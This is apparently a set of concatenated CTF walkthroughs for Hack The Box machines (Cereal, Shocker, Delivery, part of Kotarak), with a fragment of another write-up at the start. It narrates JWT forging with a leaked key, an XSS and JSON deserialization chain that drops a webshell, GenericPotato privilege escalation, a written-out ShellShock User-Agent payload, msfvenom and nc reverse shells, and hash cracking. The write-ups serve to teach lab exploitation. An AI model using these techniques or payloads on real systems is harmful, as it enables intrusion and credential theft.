The second is a trigger for the first step of privesc. It looks for write events to the hackers file, and then runs scanlosers.sh as pwn. That’s how the job managed to trigger immediately on log generation.
The webpage takes an IP address and will nmap scan that IP. to prevent players from scanning other players in their network, I set it such that it would only scan the players own IP and other HTB machines with this logic:
Basically, the given IP isn’t the users own IP and it starts with 10.10.1 but not 10.10.10 (to allow players to scan other HTB machines), then it uses static nmap output saying the host is down. It picks a random scan time between 2 and 4 seconds, and adds a sleep of that time for the right feel.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Nmap scan:
Difficulty Rating:
Release Date : 21 Nov 2020
OS : Windows
Base Points : Hard [40]
Nmap scan:
Host is up (0.034s latency).
Not shown: 65532 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  httpsCategory: Recon
nmap found three open TCP ports, SSH (22), HTTP (80), and HTTPS (443):
Based on the IIS version, the host is likely running Windows 10 or Server 2016+. nmap also identified two host names from the TLS certificate, cereal.htb and source.cereal.htb. It is interesting to note this Windows host is running OpenSSH.
Given the presence of a subdomain, I immediately starts a wfuzz to look for other virtual host subdomains. This turned out to be a mistake, and is a good lesson for checking the site quickly before kicking off brute force runs. In this case, I got some weird behavior, and in trying to figure it out, I checked the site:
I’ll want to be aware of this while path brute forcing with feroxbuster or gobuster as well.
The HTTP site just returns a 307 Temporary Redirect to the HTTPS url. The site seems to be the same visiting by IP or hostname. Visiting redirects to /login and presents a form:
Just guessing didn’t get in, and didn’t reveal information about which was wrong, username or password:
The headers don’t say much beyond IIS. What’s interesting is that the page is almost entirely JavaScript. Notably it doesn’t say ASP or ASP.NET, which is what I’m used to seeing on Windows IIS servers. There are imports to both CSS and JavaScript for files like main.36497136.chunk.css and main.be77be84.chunk.js. Googling for that CSS file returned a bunch of pages about React:
React is a JavaScript library / framework for building web applications. Digging more into the JavaScript on the page in the Firefox dev tools, that confirms it is React:
Interesting to note there’s an AdminPage directory as well.
I’ll run with a lowercase wordlist here because it’s Windows. FeroxBuster shows that the site returns a 200 status code for even junk urls. Still, it is smart enough to show me other codes:
It manages to find one interesting url, /requests, which returns a 401. There could be other 200s in there, but they are hidden by the wildcard behavior.
Running curl with -i to view the response headers shows the response:
It’s requesting a Bearer header to authenticate. This will be important.
Trying to visit source.cereal.htb returns an error:
There’s not a ton I can do with this right now, but it’s worth nothing:
FeroxBuster doesn’t have the same issues on this subdomain:
I’ll need the uploads directory later. And given the error message in the page above, I can guess that the location of this directory on disk is C:\inetpub\source\uploads.
Re-scanning the new subdomain with nmap identifies a Git repo:
Unfortunately, directory listing is disabled, returning a 403:
I can start to manually pull together information, like the information about the HEAD:
But it’s much easier to use gitdumper from GitTools. I’ve used this before on Travel and Dyplesher. After cloning the repo, I’ll give it the url and an output directory:
The directory only shows a .git folder now:
If I run git status, it will show a ton of files as deleted. That’s because Git is tracking all these files, but they aren’t on my file system, which implies they’ve been deleted since the last commit. git reset --hard will go back to where it was at the last commit, restoring all the files:
There’s a lot of code here, and it takes a while to go through and get a feel for, especially if you aren’t familiar with C#. Somethings I noticed on an initial scan:
In Controllers/RequestsController.cs there’s a hint about a deserialization attack:
CerealContext.cs defines the DB, SQLite:
Looks like blocking rules in appsettings.json:
Using JWT in Services/UserService.cs:
Unfortunately, the key has been replaced with *s.
The first step towards getting a shell is bypassing the login form. I noted above that the site is generating JWT tokens on successful login. It does not seem like a token gets set on an unsuccessful login attempt:
Some servers might set the JWT there, but with an value showing that the user isn’t authenticated, or username = None or something like that. But it’s not the case here.
Looking a bit more into the JS source in the Firefox developer tools, in /js/_services/authentication.service.js there’s the function that manages authentication:
It takes a username and password, send that as a POST to /users/authenticate, and then in the response gets the user object from the response and saves it in the browser’s local storage as currentUser. That’s different than the typical use of cookies, as this is not automatically sent on future requests, but relies on JavaScript to pull it and send it when needed.
There’s another object in that same file that retrieves the token and returns it as currentUserSubject:
Then there’s a function in js/_helpers/auth-header.js that uses that to set the Authorization header in the HTTP requests to include this token:
It is getting the currentUser object, and then getting it’s token property. That will be useful to know when I need to set the local storage later.
In js/_services/request.service.js it uses the authHeader function to set headers on requests:
In summary, the JWT is created on successful login and saved in Local Storage with a key of currentUser, and the object returned needs to have a token parameter.
In a CTF like this when I see place where a key should be in code in a git repo, it always makes sense to look at the prior commits.
Running git show 7bd9 will show the changes in the commit titled “Security fixes”. Sure enough, the key is removed:
The key is secretlhfIH&FY*#oysuflkhskjfhefesf.
On the server, the JWT is created in the Authenticate function in Services/UserServer.cs:
It looks up the user by username and password, and returns null if none are found. Otherwise, it generates a JWT using the UserId as the Name, the expiration in seven days, and the HmacSha256 algorithm with the key that’s all stars above but that hopefully I leaked from the previous commits.
The next step would be reading docs and blog posts to figure out exactly what the JWT will look like.  There’s Microsoft docs like this that show different claims. And a post like this shows that the expiration needs to be the exp parameter (and it will throw an error if that’s not in the token). Or, I could just use similar code to generate a JWT and see what it looks like. I’ll take the code above, and paste it into a new C# project I named CerealJWT in Visual Studio:
There’s a lot of red underlines. Clicking on one of them brings up a lightbulb on the left. I can click on it, and select the option to install the missing package.
It will install the package, and add a using line to the top to import it. Other times, the package is already installed, and just needs to be imported:
Clicking on “using System.Security.Claims” will add that line. A combination of those two will leave me with only two errors left:
I’m not going to import the entire Cereal User class. The first reference to it is just looking for a user ID as a string. I’ll just set it to a number, say “223”.
The last reference is storing the token. I don’t want to store it, I want to print it. So I’ll replace that entire line with Console.WriteLine(tokenHandler.WriteToken(token));.
Now I’ll Debug –> Start Without Debugging (or Ctrl+F5):
There’s a JWT! Throwing it into jwt.io gives the payload:
Playing around a bit more (and reading a bit), it turns out that either name or unique name will work here. Also, nbf (“not before”) and iat (“issued at)”) are not needed, so I can get by with just name and exp (“expires”).
Putting all of that together, I’ll create a JWT using Python:
I’ll generate a token:
In the Firefox dev tools, I’ll go to Storage, Local Storage, and add a key/value for this site:
I put in JSON so that when it looks for currentUser.token, it gets the JWT.
On refreshing the page, I’m no longer at a login form:
The site is quite simple - pick from the various options, and click request. The page sends a request in the background using AJAX, and then the response is displayed:
The POST request sent looks like:
The parameters are sent as JSON, with a single key, json, and the value being a string which is JSON. This is odd.
The response looks like:
It’s the message that’s displayed on the page, but also the id of the request.
source/Controllers/RequestsController.cs contains handlers for requests sent to /requests like above. I think the [Route("[controller]")] decoration  on the RequestController class does that mapping ("[controller]" must translate to requests somehow). There’s functions to handle different methods to this endpoint. POSTs are handled by the Create function:
This maps with what I experienced above. It is interesting to note that any request body is just stored into the DB without any validation. The fields don’t have to match any schema.
The next one is for [HttpGet("{id}")], which will handle GETs to urls like /requests/24. It pulls the data from the database based on that id, and calls JsonConvert.DeserializeObject on it.
That means if I can get an object into the database (which I can), I can try a deserialization exploit here. Only two big problems:
There’s another endpoint for a HTTP GET without the ID that returns all the cereal objects from the database:
This one doesn’t bother bother deserializing the object, but rather just the JSON string. The JavaScript on the client end can handle that string (I’ll find that code in a bit).
There are also definitions for HTTP DELETE requests, both to delete a single request and to delete all requests, both of which have the same RestrictIP decorator.
If I find a POST request submitting a cereal in Burp Proxy and send it to repeater, I can right click and change the request type, and it will now be a valid GET to /requests. I tried both /requests and /requests/10 (after creating id 10 in a POST), but both return 403 forbidden.
appsettings.json defines ApplicationOptions.Whitelist:
This is referenced in IPRequirements.cs in the IPRequirement class. In IPAddressHandler.cs, there’s a function to check if an IP is in the whitelist:
All of this is to say, to access any of the functions decorated with RestrictIP, the request will need to come from localhost.
Looking at the source on the client side in the Firefox dev tools (Debugger tab), I noted the folder called AdminPage with AdminPage.jsx:
The page calls requestService.getCerealRequests() and stores the result in the page state:
Looking in _services/request.service.js, that’s just a GET to /request (which is the request to get all requests in the DB):
The page the loads that state and deserializes it:
Then it loops over the objects displaying them on the page.
I couldn’t find a way to load the admin page completely because of the IP restrictions. Visiting /admin shows an admin page for a fraction of a second, but then redirects back to the login page and clears the token from local storage. I’ll run with Burp intercepting both requests and responses. It drops into HTTP/2, so one request leads to a lot of responses. If I catch the 403 Forbidden coming back from the GET to /requests (the “GET ALL” request from above, 403 because of the IP restriction) the page hangs at a dashboard that’s about to display the various requests:
Just for fun, I’ll verify my assumptions by coming back to this later to play with it (see Beyond Root).
The client-side Javascript is defined in the ClientApp folder, where there are package.json and package-lock.json files:
Running npm audit in this directory will report vulnerabilities in these packages. There’s a bunch of stuff found, but given what I’ve got already, one jumps out at me:
If I need a request to come from Cereal, XSS would be a pretty good way to do it.
Looking back at the Admin page, for each db entry, it’s passed into this RequestCard object:
The RequestCard is defined in the same file:
This part caught my eye:
This code is looping over the cereal requests from the GET all request, and passing the title into the vulnerable function.
The POC on the vulnerability advisory looked like:
That suggests that if I can set a cereal title to [XSS](javascript: [code]) and then someone looks at the admin page, I should get XSS.
It took some playing around with the payload, but I got this to work:
Characters like '"() all throw off the Markdown tag, so I’ll encode them. On sending that as the title, a few minutes later there was a hit on my Python webserver:
That proves not only that there is a user (or really some kind of automation) checking the admin page, but that the exploit works.
I’ll next try to convert that to a script tag, and prove to myself it works by trying to get it to request something from my VM. For this testing, it was easier to work out of a Python script to save what I was trying.
I couldn’t get <script src='[url of my host]'></script> to work. I also couldn’t get an XMLHttpRequest to my host to work. I think that’s a Same Origin policy issue. I was able to redirect the page to my webserver by setting window.location:
I had to use encoding for characters like ()" as %28, %29, and %22 respectively order for it not close out something prematurely. I was also able to write a <script> tag that had JavaScript in it and would run.
At this point there’s one more piece I need to complete this exploit. There’s a DownloadHelper.cs file in the source root. It defines a single class, DownloadHelper, which has public functions to set URL and FilePath, and on setting each, the private Download function is called, which gets a file from URL and saves it at FilePath (with a slight modification).
So if I can create one of these objects, then it will download a file to a location of my choosing.

Category: Shell as sonny
All of this comes together to form the exploit:
I’ll grab a copy of cmdasp.aspx from /usr/share/webshells that comes on Parrot (or Kali).
Now I’ll start building a Python script to exploit this. I’ll build off the JWT forging script I had earlier, changing it to store the token rather then print it. I’ll also add some code to handle parameters:
Next I need to add the request to put the serialized object into the DB. This paper from Blackhat has a ton of information on JSON deserialization. Looking at the payloads, the format typically goes:
I think version is optional, as it’s a keyword argument. With some playing around, I got this:
The JSON payload is a single key, json, with a string of JSON as the value, just like in legit POSTs. It took me a while to figure out that for the DownloadHelper object to be created, it seems like the request only happens if I give a valid location to write. I found a directory during enumeration that I can place on disk at C:\inetpub\source\uploads, and that seems like a logical place that the webserver could write, so I hard-coded that into the script.
With the serialized payload in the database, I’m going to use the XSS to have Cereal make a request to /requests/[id]. I can write a <script> tag with JavaScript in it that is executed. I’ll have it execute a XMLHttpRequest to fetch the malicious object. I’ll need to add the JWT token in as a header as well.
The final script runs, and making two requests to Cereal:
A few minutes later, there’s a request for the webshell:
Checking that url, it’s there:
And it runs commands:
Originally I used the webshell to get a reverse shell. But on more enumeration, that proved unnecessary.
In the web directory C:\inetpub\cereal, there’s a db directory that contains a single file:
Calling type on it dumps it out, much of which is binary garbage, but also the rest of which gives some clues:
The DB is SQLite, and there are a handful of tables there. I can see the XSS cereal request in the text. Another table is the Users table, which includes username and password fields.
At the very bottom, there’s the string sonny, and then mutual.madden.manner38974.
To see this more clearly, I uploaded a better ASPX webshell:
I’ll right-click on cereal.db and Save Link As… the file so I have it locally to investigate:
Opening it, I can dump the Users table and get the password:
Those creds work to auth as sonny over SSH:
And collect user.txt:

Category: Shell as root
The box is running Windows 10:
On getting a shell, I’ll check whoami /priv, and it shows SeImpersonatePrivilege, just what I was hoping to see:
This means that if I can get a hold of a System or administrator token, I can run code as that user. The common way to do that on Windows 10 / Server 2016+ is using RoguePotato or SweetPotato. Each of these use different ways to get a process running as SYSTEM to connect to a named pipe that I control, and can use to read that processed token, and then impersonate it. I abused this a bit more manually in HackBack to escalate to the Hacker user.
I’m more comfortable with RoguePotato having used it several times before (like Remote). Rogue is an update from JuicyPotato and the versions before that that abuse an RPC call to get that connection by standing up a fake OXID resolver. The issue is that in Windows 10 / Server 2016+, Windows will only try that RPC connection on TCP 135. You can still specify the host to connect to. Since Windows already has the legit service listening on 135, RoguePotato tells Windows to connect to my host on 135, where either I’m running the fake OXID resolver or I have socat setup to pipe it back to the port of my choosing on the target (where RogePotato is running the OXID resolver).
After uploading it, starting the socat redirector, and running it, there’s never a connection back:
Some troubleshooting shows that it looks like outbound TCP 135 is blocked. When I try to connect back on 80, it works:
But if I change the webserver and the request to 135, it fails to connect:
SweetPotato and PrintSpoofer get Windows to connect to them using a print job via the Print Spooler service. The problem for Cereal is that the OS is actually Windows Server Core:
ServerCore doesn’t include the Spooler service. To be sure, I can look for it:
I’ll give up on that for now.
Looking at the netstat on Cereal, there are several services listening that I didn’t see in the original nmap:
8080 is interesting, as it looks like a potential webserver. I’ll disconnect the SSH session, and reconnect with a -L 8888:127.0.0.1:8080 to listen on my localhost TCP 8888, and forward traffic through SSH to 8080 on Cereal. Then visiting http://127.0.0.1:8888 loads page:
The page is super simple, with no interaction or links or anything.
The page source is only 51 lines of HTML:
The table is actually empty in the source. The embedded JavaScript that follows it is populating the table by making a POST query to /api/graphql and then looping over the results adding rows to the table.
I can recreate that same query directly using curl:
Hacktricks has a good page on enumerating GraphQL. The query format is a bit weird if you’re not used to it, but basically it looks like:
This query will shows the types being used: query={__schema{types{name,fields{name}}}}. That looks like:
I cut out a bunch of stuff, but there’s a few interesting take aways here:
Hacktricks gives another query to pull more data, including the arguments for the mutations:
With this I can define the three mutations as something like:
GraphQL Voyager is a tool for visualizing GraphQL databases. On visiting, it loads a default db with some dummy data. I’ll click Change Schema, and then go to the Introspection tab:
Clicking Copy Introspection Query puts a huge query onto my clipboard. I’ll then go into a curl and paste it in between the two quotes here:
It’s multiple lines and creates a mess, but it will run. The resulting data is also huge, so I’m using jq to print it on a single line to more easily copy it. The result is large, but manageable:
I’ll paste that all into the textarea, and click Display:
This doesn’t show mutations, but it does show a very nice relationship between the elements.
Another cool tool to look at it GraphQL-Playground. There’s a Deb package in the latest release link, which I’ll download and install with sudo dpkg -i graphql-playground-electron_1.8.10_amd64.deb. On opening it, it asks me to create a workspace:
I’ll give it a url endpoint of http://127.0.0.1:8888/api/graphql and click open. There’s an IDE here I can use to run queries, but the DOCS button on the right is what I’m really interested in. Clicking it will bring out the queries and mutations in the DB, and clicking on one of those will show details:
I’m really interested in the updatePlant mutation because it takes a URL. That implies that it will visit that url to get some additional data. If I can make that go other places, I could have a server-side request forgery (SSRF) vulnerability.
I’ll craft a query to call the mutation giving it a sourceURL of my VM. The query instantly returns with data that seems to indicate failure:
At my Python webserver, there’s a request:
It seems like the update failed because the server returned 404, which makes sense.
GenericPotato describes itself as:
A modified version of SweetPotato by @EthicalChaos to support impersonating authentication over HTTP and/or named pipes. This allows for local privilege escalation from SSRF and/or file writes.
That is exactly what I need here. I can use it to create an HTTP listener on Cereal, and then have the SSRF connect to that HTTP service. GenericPotato will steal the token and run a command for me as the user running the web server, probably system. The blog post that accompanies the repo is really well written and goes into some good detail. I highly recommend giving it a read.
I’ll open a Windows VM and download the GenericPotato zip from Github. After unzipping, I’ll double-click the .sln file:
It’ll open in Visual Studio. I don’t think I need to change anything, but even if I did, I’ll always build the default version first and make sure it builds. If I skipped this step, and something failed when I make modifications, then I don’t know if it’s in my changes or the project as downloaded.
I’ll set the context to Release, and since there’s no x64 option, just leave it as Any CPU.
Then I’ll pick Build Solution from the Build menu, and it generates two binaries:
Because I set up my routing between my Windows VM and my Parrot VM, I can just scp from this VM onto Cereal:
I’ll also scp a nc64.exe to Cereal:
Both file are there:
Now it’s just a matter of running GenericPotato and triggering the SSRF. It’s important to note that the args are slightly different than RoguePotato, in that they take a -p for the process to run, and -a for an argument string for that process.
It’s now listening for HTTP on port 8888 (I could change that with -l).
I’ll trigger the SSRF, which will get the SYSTEM process to connect to it:
It returned false, but back at GenericPotato:
It receives a request from a process running as SYSTEM, duplicates the token, launches nc, and exits. At my nc listener, it returns a shell:
And I can grab the final flag:
My theory was that I couldn’t access /admin on the main page because of the IP restrictions. Once I had SSH as sonny, I wanted to test that. I connected the SSH using -D to create a socks proxy going over the SSH session:
I created a new proxy in FoxyProxy:
When I enable this, it will try to proxy all Firefox traffic through localhost port 8888. I’ll file a couple cereal requests (they seem to get cleared as the admin views them), and then load /admin. It worked!
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 30 Sep 2017
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.025s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1Category: Recon
nmap found two open TCP ports, SSH (2222) and HTTP (80):
Based on the OpenSSH and Apache versions, the host is likely running Ubuntu 16.04.
The site is incredibly simple:
The page source is quite short:
FeroxBuster, even with a couple extensions as just a guess, only finds index.html and a 403 forbidden on server-status, which is typical for Apache:
There’s a misconfiguration on Shocker that’s worth understanding. Typically, most webservers will handle a request to a directory without a trailing slash by sending a redirect to the same path but with the trailing slash. But in this case, there is a directory on Shocker that sends a 404 Not Found with visited without the trailing slash. I’ll dig into the configuration and why in Beyond Root.
Tools like dirsearch and dirb actually take the input wordlist and loop over each entry sending two requests, with and without the trailing slash. This is really helpful in a case like shocker, but will double the amount of requests sent (and thus time) each time there’s a scan. Both gobuster and feroxbuster have a -f flag to force adding the / to the end of directories. For Shocker, running with -f does find something else:
I show with -n because crawling in /server-status prints a ton with -f.
feroxbuster again on the /cgi-bin/ directory with some common script types used for CGI:
Just one, user.sh.
Visiting /cgi-bin/user.sh returns a file that Firefox isn’t sure how to handle:
Opening it in a text editor shows the content:
Not important to hacking Shocker, but the reason that Firefox pops the open or save file dialog rather than showing this in the browser can be seen in the raw response (seen in Burp):
The Content-Type header is text/x-sh, which is not something Firefox knows what to do with, so it goes to the raw file dialog. It looks like the script maybe trying to add a text/plain header, but it’s after the empty line, so it’s in the body not the header.
More importantly, this looks like the output of the uptime command in Linux, suggesting this is a CGI bash script running on Shocker:

Category: Shell as shelly
ShellShock, AKA Bashdoor or CVE-2014-6271, was a vulnerability in Bash discovered in 2014 which has to do with the Bash syntax for defining functions. It allowed an attacker to execute commands in places where it should only be doing something safe like defining an environment variable. An initial POC was this:
This was a big deal because lots of different programs would take user input and use it to define environment variables, the most famous of which was CGI-based web servers. For example, it’s very typically to store the User-Agent string in an environment variable. And since the UA string is completely attacker controlled, this led to remote code execution on these systems.
If I’m ok to assume based on the CGI script and the name of that box that ShellShock is the vector here, I can just test is manually. I’ll send the request for user.sh over to Burp Repeater and play with it a bit. Because the UA string is a common target, I’ll try adding the POC there:
Two potential issues to watch out for. First is that commands need full paths, as $PATH variable is empty in the environment in which the ShellShock executes.
Next, I need the echo; as the first command run for the responses to come back in an HTTP response, but it does run either way. For example, I’ll do a ping. Sending User-Agent: () { :;}; echo; /bin/ping -c 1 10.10.14.15 shows an ICMP packet at tcpdump on my VM:
The results come back in the response:
If I remove the echo;, and send User-Agent: () { :;}; /bin/ping -c 1 10.10.14.15, tcpdump still sees the ICMP packet, but the response from the server is a 500. I think that without the newline, it puts the output in the HTTP headers, which is non-compliant stuff in the headers, leading to a crash. That said, I wasn’t able to get things like python3 -c 'print()' to create the newline and return results (though it prevents the 500). I didn’t have a good explanation as to why, but also couldn’t let it go, so more in Beyond Root.
nmap has a script to test for ShellShock. I’ll need to give it the URI for the script to check:
I captured that in Wireshark to see what it was doing. The request with the exploit check is:
First, it’s worth noting that technically this is executing code on the scanned machine. So while it’s just an echo, it’s still RCE, so it’s worth knowing that and making sure you’re within scope / laws / ethics.
The result is multiple prints of the two strings, showing that ShellShock here is successful in Referer, Cookie, and User-Agent.
I’ll start a nc listener on tcp 443, and then send the following:
The web request hangs, and I get a shell at nc:
I’ll get a full shell with the normal trick:
And get user.txt:

Category: Shell as root
I also manually check sudo -l before uploading any kind of enumeration script, and it pays off here:
shelly can run perl as root.
perl has a -e option that allows me to run Perl from the command line. It also has an exec command that will run shell commands. Putting that together, I can run bash as root:
That’s enough to grab root.txt:
When I first found the /cgi-bin/ directory on Apache that responded to /cgi-bin with a 404 not found, I assumed it would be due to the DirectorySlash Apache directive:
The DirectorySlash directive determines whether mod_dir should fixup URLs pointing to a directory or not.
Typically if a user requests a resource without a trailing slash, which points to a directory, mod_dir redirects him to the same resource, but with trailing slash for some good reasons:
If you don’t want this effect and the reasons above don’t apply to you, you can turn off the redirect as shown below.
The default for this directive is On, meaning the redirect is the default behavior.
But after rooting, I couldn’t find this directive. I also noticed that cgi-bin wasn’t in /var/www/html:
It is apparently standard practice to store CGI scripts in /usr/lib. In fact, when I first landed a shell, the current directory was /usr/lib/cgi-bin.
The mystery unlocked when I started looking at the other Apache config files, specifically /etc/apache2/conf-enabled/serve-cgi-bin.conf:
The line ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/ will match on requests to /cgi-bin/ and alias them into the /usr/lib/cgi-bin/ directory. But it only matches if there’s a trailing slash!
To test this, I removed the trailing slash, leaving:
Then I reset Apache on Shocker (service apache2 restart,) and did a curl:
It returned 301 moved permanently.
When I added the slash back into the config and restarted Apache again, it went back to 404:
I noticed that I needed to start with an echo in order for the ShellShock results to come back in the HTTP request, or else the server returned 500. I figured that was to separate the HTTP header from the body, and without that, Apache is crashing. To test this theory, I tried to replace echo with python3 -c 'print()', and something strange happened. It didn’t crash, but it didn’t return any data either.
I started down a series of experiment until I think I figured out what was going on.
My first thought was that perhaps Python and echo were outputting different information. At least on my machine this wasn’t the case:
Looking at how each finished didn’t show much difference either:
I started doing experiments to see what the issue could be.
I noticed pretty quickly that nothing after Python runs. I spent a while trying to figure out what was weird about Python, but that was the wrong way to look at it. I eventually tried Perl:
Same result. What about ping after ping?
It’s looking more and more that any command kills the execution. So why not echo? Well, echo is a Bash builtin. What about other builtins (see man bash), like printf and dirs?
At this point, I don’t have any proof (I could go debugging Apache, but ugh, threads, sounds like a huge pain). I do have a good theory that I can’t find counter-examples for, and it’s this: Shellshock will run as many Bash builtins as given up to the first binary called and then stop. A slight caveat to that is that pipes don’t seem to break it. For example, I can pipe id into cut to get the first 10 characters of output without issue, even though neither cut nor id are builtins:
;, &&, and || following a  all seem to break execution at that point.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 09 Jan 2021
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.020s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8065/tcp open  unknownCategory: Recon
nmap found three open TCP ports, SSH (22), HTTP (80), and what looks like a second HTTP server on 8065:
Based on the OpenSSH version, the host is likely running Debian Buster (10). The HTTP scripts for TCP 8065 show the string “Mattermost”, so it could be an instance of that open source Slack alternative.
The site is not really for anything, but does mention checking out the helpdesk for email related support:
The link goes to helpdesk.delivery.htb. I’ll add both that subdomain and the base domain (delivery.htb) to my local /etc/hosts file.
Clicking on the “Contact Us” link displays another window:
The HelpDesk link is the as the one above. The MatterMost server link is to helpdesk.htb:8065, which explains the other port. There’s also some hint here as to the path. I need to get a @delivery.htb email to get access to the MatterMost server.
This is an instance of osTicket:
As a guest user, I can create a ticket:
And it will give me a page saying it’s been accepted:
The email to add to the ticket is interesting. I’ll note that.
The Sign In link has a form, as well as a registration link:
On clicking “Create an account” and filling out the form, it gives me a page that says a link has been sent to the email to activate it. On HTB, that’s basically a deadend. If I try to log in, it returns this error:
If I click the Check Ticket Status link, it asks for an email or ticket number. Because no validation was done of my email when submitting a ticket as a Guest User, I can enter that email and ticket number:
This page gives the current ticket, with the option to update it:
The main page here is a login form:
The create account link leads to another form:
Submitting also leads to an email confirmation step:
Without an email address, not much I can do here.

Category: Shell as maildeliverer
The note above suggested that I needed a @delivery.htb email address to get an account. It looks like it will work without one, but practically, I can’t receive emails at an outside account because HTB labs are not connected to the internet.
I did note that when I created a ticket, it offered the ability to update the ticket over email. I can use that to get the verification email.
I’ll create a ticket and get the email address for it. Then sign up for a MatterMost account:
Back at HelpDesk, giving it the same email I originally gave (0xdf@0xdf.com) and the ticket number provides access to the ticket, which has the MatterMost confirmation email in it:
Visiting the link in the ticket verifies the account:
One logging in, there’s a chance to join a team:
On joining that team, there’s a single channel, with some chat from root:
I’ll note creds for the account maildeliverer, as well as a hint that a lot of the passwords on the box are variants of “PleaseSubscribe!”, and a note about how Hashcat rules will find the variants.
Those creds do work to SSH to the box:
And grab user.txt:

Category: Shell as root
Mattermost stores it’s configuration in /opt/mattermost/config/config.json. The database connection information is in here:
The database password is there, along with a hint as to where to go next.
I’ll connect to the DB with the creds in the config above:
There’s only the default DB and mattermost:
I can see from the prompt that I’m already using the mattermost db, but if I needed to switch, use mattermost would do that. The mattermost database has a lot of tables:
I’ll start with the users table:
A lot of those look like other users or me. I’ll focus on the root user.
I’ll drop the hash into a file:
Based on the comments from Mattermost, I’ll create a file with the password:
Now I can run with a rule file to get different variations on the passwords in the file (just one in this case). There are many in /usr/share/hashcat/rules, but why not start with the one called “best”:
It cracks pretty quickly.
That password works for the root account on Delivery:
I can grab root.txt:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 23 Sep 2017
OS : Linux
Base Points : Hard [40]
Nmap scan:
Host is up (0.022s latency).                                                    
Not shown: 65530 closed ports                                                   
PORT      STATE    SERVICE                                                      
22/tcp    open     ssh                                                          
8009/tcp  open     ajp13     
8080/tcp  open     http-proxy
32939/tcp filtered unknown                                                      
60000/tcp open     unknownCategory: Recon
nmap found four open TCP ports, SSH (22), HTTP Tomcat (8080), Tomcat AJP (8009), and HTTP Apache (60000):
Based on the OpenSSH and Apache versions, the host is likely running Ubuntu Xenial 16.04.
Visiting the site at http://10.10.10.55:8080 just returns a 404:
I can check the Tomcat manager page at /manager/html, but it wants username and password:
None of the defaults work.
I did run FeroxBuster against the site, and it returned a lot, but nothing particularly interesting. It’s all default Tomcat stuff, and all requires credentials.
TCP 8009 is a default Tomcat port, and it gives access to the same kind of stuff that I would get with /manager/html on 8080, but using a binary protocol instead of HTTP. Hacktricks has a post on Pentesting AJP, but there’s not a ton here.
I did play with the ghostcat script a bit to see if I could exfil files, and I could read the WEB-INF/web.xml like in the example:
Still, there’s not much of interest in that folder, and trying to read outside that folder fails.
The site is the Kotarak Web Hosting Private Browser:
None of the links lead anywhere.
The HTTP response headers don’t show much besides Apache. Guessing at what page the root might be, index.html doesn’t exist, but index.php does, so the site is running PHP over Apache.
Running FeroxBuster with -x php to include PHP extensions shows three pages:
/info.php runs phpinfo():
file_uploads is on:
This means if I can find an LFI, I can get RCE through the PHPInfo page like I showed in Nineveh. I’ll keep an eye out for that.
/index.php is the main page.
The page asks me to submit a url for it to scan. I’ll start a Python webserver on my host (python3 -m http.server 80) and then give it my host as a url (http://10.10.14.15/). It connects:
And then shows the empty directory:
I can try some things to read local files from Kotarak. Giving it file:///etc/passwd returns “try harder”

Category: Shell as Tomcat on dmz
I can use this to check for listening ports on Kotarak. For example, when I curl port 22, I get the SSH banner, and then an error:
Looking at port 10 (unlikely to be listening), there’s an empty response:
I can create a Bash loop to check all 65535 ports for responses:
This will loop over the numbers 0 to 65535. For each, it will submit http://127.0.0.1:${i} to the Kotarak browser, where ${i} is the Bash variable. It will store the result in $res. It gets the length of $res, and if that’s longer than 0, it prints ${i} and the first line of $res up to 100 characters.
Running this got through about 1000 ports per minute, so it got through the first 1000 ports pretty quickly, but the entire loop takes a while. I can start enumerating the lower ports right away, but I let it run to completion because this box already had a service hidden at tcp 60000 (and I had to step away from the computer for a bit anyway).
I can step through the different ports identified above. SSH (22), Tomcat (8080, though interestingly no response from 8009), and 60000 (Apache) are the same services available to the outside. 3306 looks like MySQL, which makes sense for that port. I could play with trying to use Gopher to access it, though without creds, that seems like a longshot.
There are likely HTML pages on 90, 110, 200, 320, and 888. I’ll jump back to the 60000 webpage to check those out.
90 returns:
110 has another dummy page:
As does 200:
320 has a login form:
This is interesting. I can’t just put a password in and try to login, as the POST goes back to the service on 60000, not the on on 320. I can come back to this and play with trying to send a POST request using Gopher or something else, but I didn’t end up using this, and confirmed on rooting that it was just a static page, so a rabbit hole.
Port 888 presents a “Simple File Viewer”:
The images don’t load (the references are to port 888, and my browser can’t access those). And the links are broken on clicking on them as they look like:
Clicking this will load http://10.10.10.55:60000/url.php?doc=on. But if I was directly visiting http://127.0.0.1:888, it would load http://127.0.0.1:888/?doc=on. I can put that into the Kotarak browser, and it returns nothing. That makes sense, as the page says on is zero bytes. Of the three files of any size, two aren’t useful. blah is a bunch of As, tetris.c is exactly what you might expect, C code for a game that looks like Tetris. backup is:
This is the tomcat_users.xml file that configures access to Tomcat.
The admin user in the backup file has access to manager and manager-gui, so I’ll try visiting http://10.10.10.55:8080 again, and entering the creds lets me in:
To get a shell from here is relatively simple, just like in Jerry and Tabby (though in Tabby I had to use the text-based manager instead of the html one because the user I leaked had only  manager-script).
I’ll generate a reverse shell payload using msfvenom:
To upload the WAR, I’ll use the “WAR file to deploy” section on the page, using the browse button to select rev.war:
On hitting Deploy, /rev now shows up as an application:
With nc listening, I’ll click /rev, and it returns a blank page, but also a shell at nc:
Shell upgrade with the standard trick:

Category: Shell as atanas on dmz
The hostname with this shell is kotarak-dmz, which implies there’s another host I will try to go after.
The ifconfig shows that the IP of this host is 10.10.10.55, which for HTB means that I’m on the main VM. There’s also a lxcbr0 adapter with the IP 10.0.3.1. LXC is a container system, so I suspect I need to get into a container on that network.
I’ll There are two home directories on this dmz host:
user.txt is in atanas, but I can’t read it as tomcat:
/home/tomcat (which isn’t actually the home directory for the tomcat user, but it’s still there) holds two files in a subdirectory:
The .bin reports to be a Windows registry file, where as file doesn’t recognize the .dit as anything more than data:
The .dit is likely the active directory database from a domain controller, ntds.dit.
